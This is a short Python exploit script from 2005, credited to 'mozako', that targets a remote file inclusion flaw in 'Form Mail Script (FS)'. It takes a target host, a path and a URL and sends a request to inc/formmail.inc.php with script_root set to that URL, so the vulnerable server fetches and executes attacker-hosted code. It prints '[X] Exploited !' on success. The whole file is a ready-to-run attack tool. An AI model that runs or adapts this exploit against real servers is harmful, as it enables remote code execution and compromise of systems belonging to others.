#!/usr/bin/python
# Form Mail Script (FS) remote file inclusion exploit
# Coded by: mozako - mozako [at] mybox [dot] it
# Vuln. Discovered by: Filip Groszynski
# 5 March 2005
#
# (C) 2005 badroot security
import urllib2
import sys
__argv__ = sys.argv
def usage():
   print "Form Mail Script (FS) remote file inclusion exploit \nby:
mozako\n3.3.2005\n\nUsage:\n$ ./phpN.py -h http://123.4.5.6 -p
/PHP_News_Path/ -u http://filetoupload"
   sys.exit(-1)
if len(__argv__) < 2:
   usage()
try:
   global host
   global path
   global url
   host = __argv__[2]
   path = __argv__[4]
   url = __argv__[6]
except IndexError:
       usage()
def hack():
   try:
       print "[X] Connecting...",
       urllib2.urlopen(host + path +
"inc/formmail.inc.php?script_root=" + url)
       print "[OK]"
       print "[X] Sending exploit...", "[OK]"
       print "[X] Exploited !"
   except urllib2.HTTPError:
       print "[Failed]"
   except urllib2.httplib.InvalidURL:
       print "[Bad host]\nis there http:// ? :)"
   except ValueError:
       print "[Bad host]\nis there http:// ? :)"
hack()
# eof

